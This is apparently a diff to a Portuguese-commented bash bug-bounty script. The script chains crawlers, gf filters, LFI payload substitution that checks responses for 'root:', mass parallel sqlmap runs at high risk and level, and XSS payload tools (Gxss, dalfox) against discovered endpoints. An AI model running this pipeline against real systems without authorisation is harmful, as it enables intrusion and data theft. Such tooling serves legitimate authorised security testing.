@@ -135,27 +135,35 @@ cat "$folder/live_subdomains.txt" | waybackurls >> "$folder/Endpoints.txt"
 echo "Executando gospider..."
 gospider -S "$folder/live_subdomains.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep "code-200" | awk '{print $5}' >> "$folder/Endpoints.txt"
 
-# Executando katana com a flag -jc para encontrar mais endpoints
+# Executando katana 
 echo "Finding endpoints with katana..."
 cat "$folder/live_subdomains.txt" | katana -d 10 -jc >> "$folder/Endpoints.txt"
 
 # Removendo duplicatas usando uro
 echo "Removing duplicates from Endpoints.txt..."
-uro -i "$folder/Endpoints.txt" -o "$folder/Endpoints.txt"
+cat "$folder/Endpoints.txt" | uro | anew "$folder/EndpointsL.txt"
+rm "$folder/Endpoints.txt"
 
 # Usando gf patterns
 echo "Finding gf lfi vulnerabilities with gf..."
 # Passar caminho da Wordlist de paylouds!!!
 # https://raw.githubusercontent.com/mrxbug/lfi-paylouds-small/main/lfi.txt
-cat "$folder/Endpoints.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
+cat "$folder/EndpointsL.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
 cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
 xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
 mv Lfi.txt "$folder/lfi.txt"
 rm templfi.txt
 
-# Usando Finding XSS vulnerabilities
+#  Sqli vulnerabilities
+#  Passar caminho ferramenta Sqlmap ~/tools/sqlmap/sqlmap.py
+echo "Finding gf Sqli vulnerabilities..."
+cat "$folder/EndpointsL.txt" | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q sqli.txt
+cat sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir="$folder/sqlmapVUL.txt" 2> /dev/null" &> /dev/null
+mv sqli.txt "$folder/sqli.txt"
+
+#  XSS vulnerabilities
 echo "Finding XSS vulnerabilities with gf..."
-cat "$folder/Endpoints.txt" | gf xss >> "$folder/xss.txt"
+cat "$folder/EndpointsL.txt" | gf xss >> "$folder/xss.txt"
 
 # Usando Gxss para enviar payloads para endpoints XSS potenciais
 echo "Sending payloads with Gxss..."
@@ -164,8 +172,6 @@ cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"
 # Analisando referências XSS com dalfox
 echo "Analyzing XSS references with dalfox..."
 dalfox file "$folder/XSS_Ref.txt" -o "$folder/Vulnerable_XSS.txt"
-
-echo "Vulnerable XSS endpoints saved in $folder/Vulnerable_XSS.txt"
 
 # Usando Running Nuclei Severity
 echo "Running Nuclei Severity..."
